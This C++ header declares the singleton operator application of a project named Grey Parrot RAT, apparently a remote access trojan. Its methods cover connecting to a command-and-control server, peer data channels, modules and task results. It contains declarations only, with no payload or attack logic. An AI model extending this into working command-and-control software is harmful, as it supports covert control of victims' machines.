//
// Created by alsah on 11.03.23.
//

#ifndef GREY_PARROT_RAT_OPERATOR_APP_H
#define GREY_PARROT_RAT_OPERATOR_APP_H

#include <string>
#include <memory>
#include <mutex>
#include <condition_variable>
#include <QWidget>


#include "operator-app-version.h"

#include "core-data.pb.h"

#include "BS_thread_pool.hpp"
#include "core/OperatorModulesManager.h"
#include "core/OperatorTasksManager.h"

#include "tasks-managing/TasksManagerBase.h"
#include "networking/ConnectionsManager.h"

#include "TaskExecutor.h"
#include "CoreCtrlBridge.h"
#include "ModuleInfo.h"


class OperatorApp : public TaskGenerator {

public:
    //singleton pattern
    OperatorApp(OperatorApp &other) = delete;
    void operator=(const OperatorApp &) = delete;

    static std::shared_ptr<OperatorApp> GetInstance(QWidget* parent = nullptr);

    void stop();
    void connect(const std::string& c2sever);
    void setResultsHandler(const std::shared_ptr<CoreCtrlBridge> &resultsHandler);
    void requestNotifications();

    void connectToPeer(const std::string& peer);
    void disconnectFromPeer();

    std::shared_ptr<rtc::DataChannel> requestDC(const ModuleInfo &moduleInfo);

    [[nodiscard]] std::vector<std::shared_ptr<TaskGenerator>> getTaskGenerators(const std::vector<std::string>& names);
    [[nodiscard]] std::vector<ModuleInfo> getModulesInfo() const;
    [[nodiscard]] std::vector<TaskInfo> getRunningTasks() const;
    [[nodiscard]] const std::string &getVersion() const;

private:

    // OperatorApp as TaskGenerator does not have a gui
public:
    QWidget *getUI(QWidget *parent) override;

private:


    OperatorApp();

protected:
    void setDataChannelHandlers() override;

private:
    void handleResult(Task task) override;

    const std::string version = GREY_PARROT_OPERATOR_APP_VERSION;
    std::future<void> connectResult;

    static BS::thread_pool pool;
    static std::shared_ptr<OperatorApp> instance;

    std::shared_ptr<ConnectionsManager> connectionsManager;
    std::shared_ptr<OperatorTasksManager> tasksManager;
    std::shared_ptr<OperatorModulesManager> modulesManager;

    std::shared_ptr<CoreCtrlBridge> resultsHandler;
};


#endif //GREY_PARROT_RAT_OPERATOR_APP_H
